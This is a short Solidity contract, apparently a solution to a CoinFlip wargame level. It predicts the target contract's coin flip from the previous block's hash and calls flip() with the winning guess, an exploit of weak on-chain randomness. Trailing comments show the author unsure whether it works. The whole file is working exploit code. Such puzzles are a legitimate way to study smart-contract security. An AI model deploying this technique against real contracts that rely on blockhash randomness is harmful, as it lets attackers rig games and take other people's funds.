// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlip {
    function flip(bool _guess) external;
}

contract AttackCoin {


    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    IFlip immutable public coinFlipAddress;
    // IFlip CoinFlip = IFlip(coinFlipAddress);

    constructor(address _coinFlipAddress) {
        coinFlipAddress = IFlip(_coinFlipAddress);
    }

    function attack() public {

        coinFlipAddress.flip(guesser());
    }

    function guesser() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

//not sure why this is not working
// I think it's working now gotta do sum tests tho
